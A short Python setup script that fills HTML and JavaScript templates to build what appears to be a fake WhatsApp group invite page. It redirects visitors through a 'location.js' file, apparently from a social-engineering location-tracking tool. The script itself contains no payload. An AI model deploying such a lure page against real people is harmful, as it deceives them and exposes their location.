#!/usr/bin/env python3

import os
import shutil

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = input(f'{G}[+] {C}Group Title : {W}')
image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')

img_name = image.split('/')[-1]
try:
    shutil.copyfile(image, f'template/whatsapp_redirect/images/{img_name}')
except Exception as e:
    print(f'\n{R}[-] {C}Exception : {W}{e}')
    exit()

with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp_redirect/index.html', 'w') as new_index:
    new_index.write(code)

redirect = input(G + '[+]' + C + ' Enter WhatsApp Group URL : ' + W)
with open('template/whatsapp_redirect/js/location_temp.js', 'r') as js:
	reader = js.read()
	update = reader.replace('REDIRECT_URL', redirect)

with open('template/whatsapp_redirect/js/location.js', 'w') as js_update:
	js_update.write(update)